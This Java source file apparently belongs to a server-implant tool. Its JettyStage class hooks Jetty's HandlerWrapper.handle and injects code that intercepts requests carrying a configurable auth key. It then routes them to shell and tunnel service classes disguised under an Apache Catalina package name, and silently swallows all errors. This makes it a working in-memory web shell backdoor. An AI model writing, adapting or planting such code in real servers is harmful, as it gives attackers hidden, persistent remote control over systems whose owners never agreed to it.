package indi.augusttheodor.stage;

import indi.augusttheodor.Options;

import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class JettyStage implements Stage {
    @Override
    public String getName() {
        return "jetty";
    }
    @Override
    public Map<String, String[]> getHookPoints() {
        Map<String, String[]> re = new HashMap<>();
        re.put("org.eclipse.jetty.server.handler.HandlerWrapper", new String[]{"handle"});
        return re;
    }
    @Override
    public void configure(Options options) {
        if (options.hasOption("a")) {
            String[] authKey = options.getOptionValue("a").split(":");
            ServletCompat.AUTH_KEY = authKey[0];
            ServletCompat.AUTH_VALUE = authKey[1];
        }
    }
    @Override
    public Set<String> getMarkers() {
        return new HashSet<>(Arrays.asList("org.eclipse.jetty.server.Server"));
    }
    @Override
    public String getInjectedSource(String className, String methodName, Options options) {
        return "{" +
                "try{" +
                "java.util.Map _ag=indi.augusttheodor.stage.ServletCompat.handle($3,$4);" +
                "if(_ag!=null){" +
                "java.util.Map _rd=indi.augusttheodor.stage.ServletCompat.getRdd(_ag);" +
                "try{org.apache.catalina.core.RebeyondServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "try{org.apache.catalina.core.ExtendServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "try{org.apache.catalina.core.NeoServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "}" +
                "}catch(Throwable _t){}" +
                "}";
    }
}
